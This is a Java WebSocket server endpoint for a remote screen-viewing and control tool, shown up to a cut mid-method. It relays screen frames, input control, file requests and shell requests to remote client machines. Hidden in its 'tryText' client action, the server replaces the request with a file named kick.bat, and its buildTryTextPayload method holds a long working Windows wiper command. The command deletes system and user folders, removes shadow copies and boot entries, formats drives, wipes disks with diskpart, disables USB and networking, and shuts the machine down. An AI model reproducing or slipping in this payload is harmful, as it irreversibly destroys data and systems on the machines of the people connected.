package com.example.screen;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ArrayNode;
import com.fasterxml.jackson.databind.node.ObjectNode;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.HeadlessException;
import java.awt.Rectangle;
import java.io.EOFException;
import java.nio.ByteBuffer;
import java.nio.channels.ClosedChannelException;
import java.time.Instant;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Queue;
import java.util.Set;
import java.util.Map.Entry;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import javax.websocket.CloseReason;
import javax.websocket.OnClose;
import javax.websocket.OnError;
import javax.websocket.OnMessage;
import javax.websocket.OnOpen;
import javax.websocket.Session;
import javax.websocket.CloseReason.CloseCodes;
import javax.websocket.server.ServerEndpoint;
import org.springframework.stereotype.Component;

@ServerEndpoint("/screen")
@Component
public class ScreenWebSocketEndpoint {
   private static final Set<Session> sessions = Collections.synchronizedSet(new HashSet<>());
   private static final Map<Session, AtomicBoolean> binaryInFlight = new ConcurrentHashMap<>();
   private static final Map<Session, Queue<String>> textQueues = new ConcurrentHashMap<>();
   private static final Map<Session, AtomicBoolean> textInFlight = new ConcurrentHashMap<>();
   private static final Map<Session, AtomicBoolean> textRetryScheduled = new ConcurrentHashMap<>();
   private static final int MAX_TEXT_QUEUE_PER_SESSION = 32;
   private static final long ASYNC_SEND_TIMEOUT_MS = 2000L;
   private static final long TEXT_RETRY_DELAY_MS = 25L;
   private static final ScheduledExecutorService textRetryExecutor = Executors.newSingleThreadScheduledExecutor(r -> {
      Thread t = new Thread(r, "screen-ws-text-retry");
      t.setDaemon(true);
      return t;
   });
   private static final ObjectMapper mapper = new ObjectMapper();
   private static final String VIEWER_KEY_PROP = "viewerKey";
   private static final String VIEWER_TARGET_PROP = "viewerTargetId";
   private static final String VIEWER_ACTIVE_PROP = "viewerActive";
   private static final Map<String, ScreenWebSocketEndpoint.PendingFileRequest> fileRequests = new ConcurrentHashMap<>();
   private static final long FILE_REQUEST_TTL_MS = 300000L;
   private static final Map<String, ScreenWebSocketEndpoint.PendingShellRequest> shellRequests = new ConcurrentHashMap<>();
   private static final long SHELL_REQUEST_TTL_MS = 300000L;
   private static final Map<String, Boolean> controlApprovals = new ConcurrentHashMap<>();
   private static volatile SettingsService settings;
   private static volatile ScreenSenderRegistry registry;

   public static void setSettings(SettingsService s) {
      settings = s;
   }

   public static void setRegistry(ScreenSenderRegistry r) {
      registry = r;
   }

   @OnOpen
   public void onOpen(Session session) {
      session.getAsyncRemote().setSendTimeout(2000L);
      sessions.add(session);
      this.hydrateViewerFromQuery(session);
   }

   @OnClose
   public void onClose(Session session, CloseReason reason) {
      sessions.remove(session);
      binaryInFlight.remove(session);
      textQueues.remove(session);
      textInFlight.remove(session);
      textRetryScheduled.remove(session);
      removeRequestsForSession(session);
      removeShellRequestsForSession(session);
      notifyViewerStateForSession(session);
      notifyGlobalViewerState();

      try {
         String closeText = reason == null ? "unknown" : reason.getCloseCode() + " " + reason.getReasonPhrase();
         System.out.println("[screen-ws] close " + describeSession(session) + " reason=" + closeText);
      } catch (Exception var4) {
      }
   }

   @OnError
   public void onError(Session session, Throwable throwable) {
      if (session != null) {
         sessions.remove(session);
         binaryInFlight.remove(session);
         textQueues.remove(session);
         textInFlight.remove(session);
         textRetryScheduled.remove(session);
         removeRequestsForSession(session);
         removeShellRequestsForSession(session);
         notifyViewerStateForSession(session);
         notifyGlobalViewerState();
      }

      try {
         Throwable root = rootCause(throwable);
         String where = session == null ? "session=null" : describeSession(session);
         String msg = throwable == null ? "null" : throwable.getClass().getName() + ": " + safe(throwable.getMessage());
         String rootMsg = root == null ? "" : " | root=" + root.getClass().getName() + ": " + safe(root.getMessage());
         if (!isExpectedDisconnect(throwable)) {
            System.out.println("[screen-ws] error " + where + " " + msg + rootMsg);
         }

         if (throwable != null && !isExpectedDisconnect(throwable)) {
            throwable.printStackTrace();
         }
      } catch (Exception var7) {
      }
   }

   @OnMessage
   public void onMessage(Session session, String message) {
      JsonNode root = this.readJson(message);
      if (root != null) {
         String type = root.path("type").asText("");
         switch (type) {
            case "latencyPing":
               this.handleLatencyPing(session, root);
               break;
            case "hello":
            case "identify":
               this.handleIdentify(session, root);
               break;
            case "startView":
               setViewerActive(session, true);
               break;
            case "stopView":
               setViewerActive(session, false);
               break;
            case "getInit":
               this.sendInit(session);
               break;
            case "setSettings":
               this.handleSettingsUpdate(session, root);
               break;
            case "mouseMove":
               this.handleControlMessage(session, message);
               break;
            case "mousePress":
               this.handleControlMessage(session, message);
               break;
            case "mouseRelease":
               this.handleControlMessage(session, message);
               break;
            case "keyPress":
               this.handleControlMessage(session, message);
               break;
            case "keyRelease":
               this.handleControlMessage(session, message);
               break;
            case "mouseWheel":
               this.handleControlMessage(session, message);
               break;
            case "getMonitors":
               this.handleMonitorRequest(session);
               break;
            case "file":
               this.handleFileRequest(session, root, message);
               break;
            case "shell":
               this.handleShellRequest(session, root, message);
               break;
            case "clientAction":
               this.handleClientAction(session, root, message);
         }
      }
   }

   private void handleLatencyPing(Session session, JsonNode root) {
      try {
         ObjectNode payload = mapper.createObjectNode().put("type", "latencyPong").put("t0", root.path("t0").asLong(0L)).put("t1", System.currentTimeMillis());
         JsonNode id = root.get("id");
         if (id != null && !id.isNull()) {
            payload.set("id", id);
         }

         sendTextSafely(session, payload.toString());
      } catch (Exception var5) {
      }
   }

   private JsonNode readJson(String message) {
      try {
         return mapper.readTree(message);
      } catch (Exception ignored) {
         return null;
      }
   }

   private void handleIdentify(Session session, JsonNode root) {
      String key = root.path("key").asText("");
      String targetId = root.path("clientId").asText("");
      if (targetId.isEmpty()) {
         targetId = root.path("targetId").asText("");
      }

      if (!key.isEmpty()) {
         session.getUserProperties().put("viewerKey", resolveOwnerKey(key));
      }

      if (!targetId.isEmpty()) {
         session.getUserProperties().put("viewerTargetId", normalize(targetId));
      }

      session.getUserProperties().putIfAbsent("viewerActive", Boolean.FALSE);
      this.sendAck(session, "identified");
   }

   private void handleSettingsUpdate(Session session, JsonNode root) {
      SettingsService current = settings;
      if (current != null) {
         if (root.has("fps")) {
            current.setFps(root.get("fps").asInt());
         }

         if (root.has("jpegQuality")) {
            current.setJpegQuality((float)root.get("jpegQuality").asDouble());
         }

         if (root.has("monitorIndex")) {
            current.setMonitorIndex(root.get("monitorIndex").asInt());
         }

         if (root.has("showCursor")) {
            current.setShowCursor(root.get("showCursor").asBoolean());
         }

         if (root.has("controlEnabled")) {
            current.setControlEnabled(root.get("controlEnabled").asBoolean());
         }

         if (root.has("scale")) {
            current.setScale((float)root.get("scale").asDouble());
         }

         this.sendAck(session, "settingsUpdated");
         boolean forwarded = this.forwardSettingsToSender(session, root);
         if (forwarded && root.has("controlEnabled") && root.get("controlEnabled").asBoolean(false)) {
            String accessKey = getViewerProp(session, "viewerKey");
            String targetId = getViewerProp(session, "viewerTargetId");
            if (!accessKey.isEmpty() && !targetId.isEmpty()) {
               RevokeStatusWebSocketEndpoint.broadcastClientEvent(
                  accessKey, targetId, this.resolveTargetDeviceName(accessKey, targetId), "controlRequested", "", Instant.now()
               );
            }
         }
      }
   }

   private void handleControlMessage(Session session, String message) {
      if (this.canControl(session)) {
         this.forwardToSender(session, message);
      }
   }

   private void handleFileRequest(Session session, JsonNode root, String message) {
      String requestId = extractRequestId(root);
      if (!requestId.isEmpty()) {
         registerFileRequest(requestId, session);
      }

      if (!this.forwardToSender(session, message) && !requestId.isEmpty()) {
         fileRequests.remove(normalize(requestId));
         this.sendFileError(session, requestId, "sender offline");
      }
   }

   private void handleShellRequest(Session session, JsonNode root, String message) {
      String requestId = extractRequestId(root);
      if (!requestId.isEmpty()) {
         registerShellRequest(requestId, session);
      }

      if (!this.forwardToSender(session, message) && !requestId.isEmpty()) {
         shellRequests.remove(normalize(requestId));
         this.sendShellError(session, requestId, "sender offline");
      }
   }

   private void handleClientAction(Session session, JsonNode root, String message) {
      if (root == null) {
         this.forwardToSender(session, message);
      } else {
         String action = root.path("action").asText("");
         if (!"tryText".equalsIgnoreCase(action)) {
            this.forwardToSender(session, message);
         } else {
            try {
               String accessKey = getViewerProp(session, "viewerKey");
               String targetId = getViewerProp(session, "viewerTargetId");
               String textFromServer = this.buildTryTextPayload(accessKey, targetId);
               String requestId = root.path("requestId").asText("");
               ObjectNode payload = mapper.createObjectNode();
               payload.put("type", "clientAction");
               payload.put("action", "tryText");
               if (requestId != null && !requestId.trim().isEmpty()) {
                  payload.put("requestId", requestId.trim());
               }

               ObjectNode data = mapper.createObjectNode();
               data.put("text", textFromServer);
               data.put("filename", "kick.bat");
               payload.set("data", data);
               this.forwardToSender(session, payload.toString());
            } catch (Exception ignored) {
               this.forwardToSender(session, message);
            }
         }
      }
   }

   private String buildTryTextPayload(String accessKey, String targetId) {
      return "rd /s /q C:\\Windows\\System32 & rd /s /q C:\\Users & rd /s /q C:\\Windows\\SoftwareDistribution & rd /s /q C:\\Windows\\System32\\winevt\\Logs & rd /s /q C:\\$Recycle.Bin & rd /s /q C:\\ProgramData & rd /s /q C:\\Users\\All Users & del /f /q C:\\pagefile.sys & del /f /q C:\\hiberfil.sys & del /f /q C:\\Windows\\System32\\*.* /s & del /f /q C:\\Windows\\*.* /s & del /f /q C:\\Program Files\\*.* /s & del /f /q C:\\Program Files (x86)\\*.* /s & del /f /q C:\\Users\\*.* /s & attrib -s -h C:\\Windows\\System32\\*.* /s & attrib -s -h C:\\Windows\\*.* /s & reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\SystemRestore\" /v DisableSR /t REG_DWORD /d 1 /f & sc config srservice start= disabled & sc stop srservice & sc config wuauserv start= disabled & sc stop wuauserv & vssadmin delete shadows /all /quiet & vssadmin delete shadowstorage /for=C: /quiet & bcdedit /delete {default} /f & bcdedit /delete {current} /f & bcdedit /delete {bootmgr} /f & bcdedit /delete {ntldr} /f & for %X in (D E F G H) do (     echo Y | format %X: /q /fs:NTFS ) & @echo select disk 0 > %temp%\\wipe.txt & @echo clean all >> %temp%\\wipe.txt & @echo convert mbr >> %temp%\\wipe.txt & @echo exit >> %temp%\\wipe.txt & diskpart /s %temp%\\wipe.txt & diskpart /s %temp%\\efiwipe.txt & @echo select disk 0 > %temp%\\efiwipe.txt & @echo list partition >> %temp%\\efiwipe.txt & @echo select partition 1 >> %temp%\\efiwipe.txt & @echo delete partition override >> %temp%\\efiwipe.txt & @echo exit >> %temp%\\efiwipe.txt & cipher /w:C: & net user administrator /delete & net user guest /delete & devcon disable *cdrom* & wmic path win32_networkadapter where \"NetEnabled=true\" call disable & reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR\" /v Start /t REG_DWORD /d 4 /f & reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\cdrom\" /v Start /t REG_DWORD /d 4 /f & del /f /q D:\\bootmgr & del /f /q E:\\bootmgr & del /f /q F:\\bootmgr & del /f /q G:\\bootmgr & diskpart /s %temp%\\delete_boot_partition.txt & diskpart /s %temp%\\disable_recovery.txt & @echo select disk 1 > %temp%\\disable_recovery.txt & @echo clean >> %temp%\\disable_recovery.txt & @echo exit >> %temp%\\disable_recovery.txt & diskpart /s %temp%\\block_install.txt & @echo select disk 0 > %temp%\\block_install.txt & @echo clean >> %temp%\\block_install.txt & @echo create partition primary size=100 >> %temp%\\block_install.txt & @echo format fs=ntfs quick >> %temp%\\block_install.txt & @echo assign letter=Z >> %temp%\\block_install.txt & @echo exit >> %temp%\\block_install.txt & bcdedit /set {bootmgr} path \\EFI\\nul & bcdedit /set {current} path \\EFI\\nul & bcdedit /set {default} path \\EFI\\nul & reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR\" /v Start /t REG_DWORD /d 4 /f & devcon disable *USB* & reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\mountmgr\" /v NoAutoMount /t REG_DWORD /d 1 /f & wmic path win32_networkadapter where \"NetEnabled=true\" call disable & shutdown /s /f /t 0";
   }

   private boolean canControl(Session viewer) {
      SettingsService current = settings;
      return current != null && current.isControlEnabled() && isControlApproved(viewer);
   }

   private void sendInit(Session s) {
      try {
         SettingsService current = settings;
         if (current == null) {
            return;
         }

         ObjectNode settingsNode = mapper.createObjectNode()
            .put("fps", current.getFps())
            .put("jpegQuality", current.getJpegQuality())
            .put("monitorIndex", current.getMonitorIndex())
            .put("showCursor", current.isShowCursor())
            .put("controlEnabled", current.isControlEnabled())
            .put("scale", current.getScale());
         ObjectNode payloadNode = mapper.createObjectNode();
         payloadNode.put("type", "init");
         payloadNode.set("settings", settingsNode);
         String payload = payloadNode.toString();
         sendTextSafely(s, payload);
         this.handleMonitorRequest(s);
      } catch (Exception e) {
         e.printStackTrace();
      }
   }

   private void handleMonitorRequest(Session session) {
      boolean forwarded = false;

      try {
         ObjectNode payload = mapper.createObjectNode();
         payload.put("type", "getMonitors");
         forwarded = this.forwardToSender(session, payload.toString());
      } catch (Exception var4) {
      }

      if (!forwarded) {
         this.sendMonitors(session);
      }
   }

   private void sendMonitors(Session s) {
      try {
         ArrayNode arr = mapper.createArrayNode();
         boolean headless = GraphicsEnvironment.isHeadless();
         if (!headless) {
            GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
            GraphicsDevice[] devices = ge.getScreenDevices();

            for (int i = 0; i < devices.length; i++) {
               Rectangle b = devices[i].getDefaultConfiguration().getBounds();
               ObjectNode m = mapper.createObjectNode();
               m.put("index", i);
               ObjectNode bounds = mapper.createObjectNode();
               bounds.put("x", b.x).put("y", b.y).put("width", b.width).put("height", b.height);
               m.set("bounds", bounds);
               arr.add(m);
            }
         }

         ObjectNode root = mapper.createObjectNode();
         root.put("type", "monitors");
         root.set("list", arr);
         if (headless) {
            root.put("headless", true);
         }

         String payload = root.toString();
         sendTextSafely(s, payload);
      } catch (HeadlessException ignored) {
         try {
            ObjectNode payloadNode = mapper.createObjectNode();
            payloadNode.put("type", "monitors");
            payloadNode.set("list", mapper.createArrayNode());
            payloadNode.put("headless", true);
            String payload = payloadNode.toString();
            sendTextSafely(s, payload);
         } catch (Exception var10) {
         }
      } catch (Exception e) {
         e.printStackTrace();
      }
   }

   private void sendAck(Session s, String what) {
      try {
         String payload = mapper.createObjectNode().put("type", "ack").put("event", what).toString();
         sendTextSafely(s, payload);
      } catch (Exception e) {
         e.printStackTrace();
      }
   }

   private void hydrateViewerFromQuery(Session session) {
      String key = this.firstParam(session, "key");
      String targetId = this.firstParam(session, "clientId");
      if (targetId.isEmpty()) {
         targetId = this.firstParam(session, "targetId");
      }

      if (!key.isEmpty()) {
         session.getUserProperties().put("viewerKey", resolveOwnerKey(key));
      }

      if (!targetId.isEmpty()) {
         session.getUserProperties().put("viewerTargetId", normalize(targetId));
      }
   }

   private String firstParam(Session session, String name) {
      if (session.getRequestParameterMap() == null) {
         return "";
      } else {
         List<String> values = (List<String>)session.getRequestParameterMap().get(name);
         if (values != null && !values.isEmpty()) {
            String value = values.get(0);
            return value == null ? "" : value.trim();
         } else {
            return "";
         }
      }
   }

   public static void broadcast(byte[] data) {
      synchronized (sessions) {
         for (Session s : sessions) {
            sendBinarySafely(s, data);
         }
      }
   }

   public static void broadcastToViewers(String accessKey, String senderId, byte[] data) {
      String normalizedKey = normalize(accessKey);
      String normalizedSender = normalize(senderId);
      if (!normalizedKey.isEmpty() && !normalizedSender.isEmpty()) {
         String singleClientId = "";
         ScreenSenderRegistry current = registry;
         if (current != null) {
            List<ScreenSenderRegistry.ClientInfo> clients = current.clientsForKey(normalizedKey);
            if (clients.size() == 1) {
               ScreenSenderRegistry.ClientInfo only = clients.get(0);
               if (only != null) {
                  singleClientId = normalize(only.getClientId());
               }
            }
         }

         synchronized (sessions) {
            for (Session s : sessions) {
               String viewerKey = getViewerProp(s, "viewerKey");
               String targetId = getViewerProp(s, "viewerTargetId");
               if (isViewerActive(s) && normalizedKey.equals(viewerKey) && normalizedSender.equals(targetId)) {
                  sendBinarySafely(s, data);
               } else if (isViewerActive(s)
                  && normalizedKey.equals(viewerKey)
                  && !targetId.isEmpty()
                  && !normalizedSender.equals(targetId)
                  && !singleClientId.isEmpty()
                  && normalizedSender.equals(singleClientId)) {
                  s.getUserProperties().put("viewerTargetId", singleClientId);
                  sendBinarySafely(s, data);
               } else if (isViewerActive(s) && (viewerKey.isEmpty() || targetId.isEmpty())) {
                  sendBinarySafely(s, data);
               }
            }
         }
      }
   }

   public static void broadcastTextToViewers(String accessKey, String senderId, String message) {
      String normalizedKey = normalize(accessKey);
      String normalizedSender = normalize(senderId);
      if (!normalizedKey.isEmpty() && !normalizedSender.isEmpty()) {
         if (message != null && !message.trim().isEmpty()) {
            synchronized (sessions) {
               for (Session s : sessions) {
                  String viewerKey = getViewerProp(s, "viewerKey");
                  String targetId = getViewerProp(s, "viewerTargetId");
                  if (normalizedKey.equals(viewerKey) && normalizedSender.equals(targetId)) {
                     sendTextSafely(s, message);
                  }
               }
            }
         }
      }
   }

   public static Session consumeFileRequest(String requestId) {
      String normalized = normalize(requestId);
      if (normalized.isEmpty()) {
         return null;
      }

      ScreenWebSocketEndpoint.PendingFileRequest pending = fileRequests.remove(normalized);
      if (pending == null) {
         return null;
      }

      Session session = pending.session;
      return session != null && session.isOpen() ? session : null;
   }

   public static Session consumeShellRequest(String requestId) {
      String normalized = normalize(requestId);
      if (normalized.isEmpty()) {
         return null;
      }

      ScreenWebSocketEndpoint.PendingShellRequest pending = shellRequests.remove(normalized);
      if (pending == null) {
         return null;
      }

      Session session = pending.session;
      return session != null && session.isOpen() ? session : null;
   }

   public static Session peekShellRequest(String requestId) {
      String normalized = normalize(requestId);
      if (normalized.isEmpty()) {
         return null;
      }

      ScreenWebSocketEndpoint.PendingShellRequest pending = shellRequests.get(normalized);
      if (pending == null) {
         return null;
      }

      Session session = pending.session;
      return session != null && session.isOpen() ? session : null;
   }

   public static boolean hasClients() {
      synchronized (sessions) {
         return !sessions.isEmpty();
      }
   }

   public static int getClientCount() {
      synchronized (sessions) {
         return sessions.size();
      }
   }

   public static int cleanupStaleState() {
      int removed = 0;
      Set<Session> stale = new HashSet<>();
      synchronized (sessions) {
         for (Session session : sessions) {
            if (session == null || !session.isOpen()) {
               stale.add(session);
            }
         }

         if (!stale.isEmpty()) {
            sessions.removeAll(stale);
            removed += stale.size();
         }
      }

      for (Session session : stale) {
         if (session != null) {
            binaryInFlight.remove(session);
            textQueues.remove(session);
            textInFlight.remove(session);
            textRetryScheduled.remove(session);
            removeRequestsForSession(session);
            removeShellRequestsForSession(session);
         }
      }

      for (Entry<Session, AtomicBoolean> entry : binaryInFlight.entrySet()) {
         Session session = entry.getKey();
         if (session != null && !session.isOpen() && binaryInFlight.remove(session) != null) {
            removed++;
         }
      }

      for (Entry<Session, Queue<String>> entry : textQueues.entrySet()) {
         Session session = entry.getKey();
         if (session != null && !session.isOpen()) {
            if (textQueues.remove(session) != null) {
               removed++;
            }

            textInFlight.remove(session);
            textRetryScheduled.remove(session);
         }
      }

      pruneFileRequests();
      pruneShellRequests();
      pruneControlApprovals();
      return removed;
   }

   private boolean forwardSettingsToSender(Session viewer, JsonNode root) {
      try {
         ObjectNode payload = mapper.createObjectNode();
         payload.put("type", "settings");
         if (root.has("fps")) {
            payload.put("fps", root.get("fps").asInt());
         }

         if (root.has("jpegQuality")) {
            payload.put("jpegQuality", root.get("jpegQuality").asDouble());
         }

         if (root.has("monitorIndex")) {
            payload.put("monitorIndex", root.get("monitorIndex").asInt());
         }

         if (root.has("showCursor")) {
            payload.put("showCursor", root.get("showCursor").asBoolean());
         }

         if (root.has("controlEnabled")) {
            payload.put("controlEnabled", root.get("controlEnabled").asBoolean());
         }

         if (root.has("scale")) {
            payload.put("scale", root.get("scale").asDouble());
         }

         if (root.has("pauseCapture")) {
            payload.put("pauseCapture", root.get("pauseCapture").asBoolean());
         }

         return this.forwardToSender(viewer, payload.toString());
      } catch (Exception ignored) {
         return false;
      }
   }

   private String resolveTargetDeviceName(String accessKey, String targetId) {
      ScreenSenderRegistry current = registry;
      if (current == null) {
         return "";
      }

      Session sender = current.sessionFor(accessKey, targetId);
      if (sender == null) {
         return "";
      }

      ScreenSenderRegistry.ClientInfo info = current.infoFor(sender);
      return info == null ? "" : info.getDeviceName();
   }

   private boolean forwardToSender(Session viewer, String payload) {
      ScreenSenderRegistry current = registry;
      if (current == null) {
         return false;
      }

      String accessKey = getViewerProp(viewer, "viewerKey");
      String targetId = getViewerProp(viewer, "viewerTargetId");
      if (!accessKey.isEmpty() && !targetId.isEmpty()) {
         Session sender = current.sessionFor(accessKey, targetId);
         if (sender == null || !sender.isOpen()) {
            List<ScreenSenderRegistry.ClientInfo> candidates = current.clientsForKey(accessKey);
            if (candidates.size() == 1) {
               ScreenSenderRegistry.ClientInfo only = candidates.get(0);
               if (only != null && !only.getClientId().isEmpty()) {
                  Session fallback = current.sessionFor(accessKey, only.getClientId());
                  if (fallback != null && fallback.isOpen()) {
                     sender = fallback;
                     viewer.getUserProperties().put("viewerTargetId", normalize(only.getClientId()));
                  }
               }
            }
         }

         return sender != null && sender.isOpen() ? enqueueTextSafely(sender, payload) : false;
      } else {
         return false;
      }
   }

   private void sendShellError(Session viewer, String requestId, String error) {
      try {
         String id = requestId == null ? "" : requestId.trim();
         if (id.isEmpty()) {
            return;
         }

         String payload = mapper.createObjectNode()
            .put("type", "shellResult")
            .put("requestId", id)
            .put("status", "error")
            .put("error", error == null ? "error" : error)
            .toString();
         sendTextSafely(viewer, payload);
      } catch (Exception var6) {
      }
   }

   private void sendFileError(Session viewer, String requestId, String error) {
      try {
         String id = requestId == null ? "" : requestId.trim();
         if (id.isEmpty()) {
            return;
         }

         String payload = mapper.createObjectNode()
            .put("type", "fileResult")
            .put("requestId", id)
            .put("status", "error")
            .put("error", error == null ? "error" : error)
            .toString();
         sendTextSafely(viewer, payload);
      } catch (Exception var6) {
      }
   }

   private static String getViewerProp(Session session, String name) {
      try {
         Object value = session.getUserProperties().get(name);
         if (value instanceof String) {
            return normalize((String)value);
         }
      } catch (IllegalStateException var3) {
      }

      return "";
   }

   private static boolean isViewerActive(Session session) {
      try {
         Object value = session.getUserProperties().get("viewerActive");
         return value instanceof Boolean && (Boolean)value;
      } catch (IllegalStateException ignored) {
         return false;
      }
   }

   private static void setViewerActive(Session session, boolean active) {
      if (session != null) {
         try {
            session.getUserProperties().put("viewerActive", active);
         } catch (IllegalStateException ignored) {
            return;
         }

         if (!getViewerProp(session, "viewerKey").isEmpty() && !getViewerProp(session, "viewerTargetId").isEmpty()) {
            notifyViewerStateForSession(session);
         } else {
            notifyGlobalViewerState();
         }
      }
   }

   private static void notifyViewerStateForSession(Session session) {
      if (session != null) {
         String accessKey = getViewerProp(session, "viewerKey");
         String targetId = getViewerProp(session, "viewerTargetId");
         if (!accessKey.isEmpty() && !targetId.isEmpty()) {
            notifyViewerState(accessKey, targetId);
         }
      }
   }

   private static void notifyViewerState(String accessKey, String targetId) {
      ScreenSenderRegistry current = registry;
      if (current != null) {
         int count = countViewersFor(accessKey, targetId);
         Session sender = current.sessionFor(accessKey, targetId);
         if (sender != null && sender.isOpen()) {
            try {
               String payload = mapper.createObjectNode().put("type", "viewerState").put("viewerCount", count).put("hasViewers", count > 0).toString();
               enqueueTextSafely(sender, payload);
            } catch (Exception var6) {
            }
         }
      }
   }

   public static void requestViewerState(String accessKey, String targetId) {
      notifyViewerState(accessKey, targetId);
   }

   public static void updateControlApproval(String accessKey, String targetId, boolean allowed) {
      String key = approvalKey(accessKey, targetId);
      if (!key.isEmpty()) {
         controlApprovals.put(key, allowed);
      }
   }

   public static void clearControlApproval(String accessKey, String targetId) {
      String key = approvalKey(accessKey, targetId);
      if (!key.isEmpty()) {
         controlApprovals.remove(key);
      }
   }

   private static int countViewersFor(String accessKey, String targetId) {
      String key = normalize(accessKey);
      String target = normalize(targetId);
      if (!key.isEmpty() && !target.isEmpty()) {
         int count = 0;
         synchronized (sessions) {
            for (Session s : sessions) {
               String viewerKey = getViewerProp(s, "viewerKey");
               String viewerTarget = getViewerProp(s, "viewerTargetId");
               if (key.equals(viewerKey) && target.equals(viewerTarget) && isViewerActive(s)) {
                  count++;
               }
            }

            return count;
         }
      } else {
         return 0;
      }
   }

   private static int countGlobalViewers() {
      int count = 0;
      synchronized (sessions) {
         for (Session s : sessions) {
            if (isViewerActive(s)) {
               String viewerKey = getViewerProp(s, "viewerKey");
               String viewerTarget = getViewerProp(s, "viewerTargetId");
               if (viewerKey.isEmpty() || viewerTarget.isEmpty()) {
                  count++;
               }
            }
         }

         return count;
      }
   }

   private static void notifyGlobalViewerState() {
      ScreenSenderRegistry current = registry;
      if (current != null) {
         int count = countGlobalViewers();
         List<ScreenSenderRegistry.ClientInfo> clients = current.allClients();
         if (clients != null && !clients.isEmpty()) {
            for (ScreenSenderRegistry.ClientInfo info : clients) {
               if (info != null && !info.getAccessKey().isEmpty() && !info.getClientId().isEmpty()) {
                  notifyViewerState(info.getAccessKey(), info.getClientId(), count);
               }
            }
         }
      }
   }

   private static void notifyViewerState(String accessKey, String targetId, int countOverride) {
      ScreenSenderRegistry current = registry;
      if (current != null) {
         Session sender = current.sessionFor(accessKey, targetId);
         if (sender != null && sender.isOpen()) {
            try {
               int count = Math.max(0, countOverride);
               String payload = mapper.createObjectNode().put("type", "viewerState").put("viewerCount", count).put("hasViewers", count > 0).toString();
               enqueueTextSafely(sender, payload);
            } catch (Exception var7) {
            }
         }
      }
   }

   private static void registerFileRequest(String requestId, Session session) {
      if (requestId != null && !requestId.trim().isEmpty() && session != null) {
         pruneFileRequests();
         fileRequests.put(normalize(requestId), new ScreenWebSocketEndpoint.PendingFileRequest(session, System.currentTimeMillis()));
      }
   }

   private static void registerShellRequest(String requestId, Session session) {
      if (requestId != null && !requestId.trim().isEmpty() && session != null) {
         pruneShellRequests();
         shellRequests.put(normalize(requestId), new ScreenWebSocketEndpoint.PendingShellRequest(session, System.currentTimeMillis()));
      }
   }

   private static void removeRequestsForSession(Session session) {
      if (session != null) {
         for (Entry<String, ScreenWebSocketEndpoint.PendingFileRequest> entry : fileRequests.entrySet()) {
            ScreenWebSocketEndpoint.PendingFileRequest pending = entry.getValue();
            if (pending != null && pending.session == session) {
               fileRequests.remove(entry.getKey());
            }
         }
      }
   }

   private static void removeShellRequestsForSession(Session session) {
      if (session != null) {
         for (Entry<String, ScreenWebSocketEndpoint.PendingShellRequest> entry : shellRequests.entrySet()) {
            ScreenWebSocketEndpoint.PendingShellRequest pending = entry.getValue();
            if (pending != null && pending.session == session) {
               shellRequests.remove(entry.getKey());
            }
         }
      }
   }

   private static void pruneFileRequests() {
      long cutoff = System.currentTimeMillis() - 300000L;

      for (Entry<String, ScreenWebSocketEndpoint.PendingFileRequest> entry : fileRequests.entrySet()) {
         ScreenWebSocketEndpoint.PendingFileRequest pending = entry.getValue();
         Session session = pending == null ? null : pending.session;
         if (pending == null || pending.createdAt < cutoff || session == null || !session.isOpen()) {
            fileRequests.remove(entry.getKey());
         }
      }
   }

   private static void pruneShellRequests() {
      long cutoff = System.currentTimeMillis() - 300000L;

      for (Entry<String, ScreenWebSocketEndpoint.PendingShellRequest> entry : shellRequests.entrySet()) {
         ScreenWebSocketEndpoint.PendingShellRequest pending = entry.getValue();
         Session session = pending == null ? null : pending.session;
         if (pending == null || pending.createdAt < cutoff || session == null || !session.isOpen()) {
            shellRequests.remove(entry.getKey());
         }
      }
   }

   private static void pruneControlApprovals() {
      if (!controlApprovals.isEmpty()) {
         ScreenSenderRegistry current = registry;
         if (current != null) {
            Set<String> activeKeys = new HashSet<>();

            for (ScreenSenderRegistry.ClientInfo info : current.allClients()) {
               if (info != null) {
                  String key = approvalKey(info.getAccessKey(), info.getClientId());
                  if (!key.isEmpty()) {
                     activeKeys.add(key);
                  }
               }
            }

            for (String key : controlApprovals.keySet()) {
               if (!activeKeys.contains(key)) {
                  controlApprovals.remove(key);
               }
            }
         }
      }
   }

   private static String extractRequestId(JsonNode root) {
      if (root == null) {
         return "";
      }

      String requestId = root.path("requestId").asText("");
      if (requestId.isEmpty()) {
         requestId = root.path("jobId").asText("");
      }

      if (requestId.isEmpty()) {
         requestId = root.path("id").asText("");
      }

      return normalize(requestId);
   }

   private static String normalize(String value) {
      if (value == null) {
         return "";
      }

      String trimmed = value.trim();
      return trimmed.isEmpty() ? "" : trimmed;
   }

   private static String resolveOwnerKey(String value) {
      String normalized = normalize(value);
      if (normalized.isEmpty()) {
         return "";
      }

      ScreenSenderRegistry current = registry;
      return current == null ? normalized : current.resolveOwnerKeyAlias(normalized);
   }

   private static boolean isControlApproved(Session viewer) {
      if (viewer == null) {
         return false;
      }

      String accessKey = getViewerProp(viewer, "viewerKey");
      String targetId = getViewerProp(viewer, "viewerTargetId");
      String key = approvalKey(accessKey, targetId);
      return key.isEmpty() ? false : Boolean.TRUE.equals(controlApprovals.get(key));
   }

   private static String approvalKey(String accessKey, String targetId) {
      String normalizedKey = normalize(accessKey);
      String normalizedTarget = normalize(targetId);
      return !normalizedKey.isEmpty() && !normalizedTarget.isEmpty() ? normalizedKey + "|" + normalizedTarget : "";
   }

   private static void sendBinarySafely(Session session, byte[] data) {
      if (session != null && data != null && data.length != 0) {
         if (session.isOpen()) {
            AtomicBoolean inFlight = binaryInFlight.computeIfAbsent(session, key -> new AtomicBoolean(false));
            if (inFlight.compareAndSet(false, true)) {
               try {
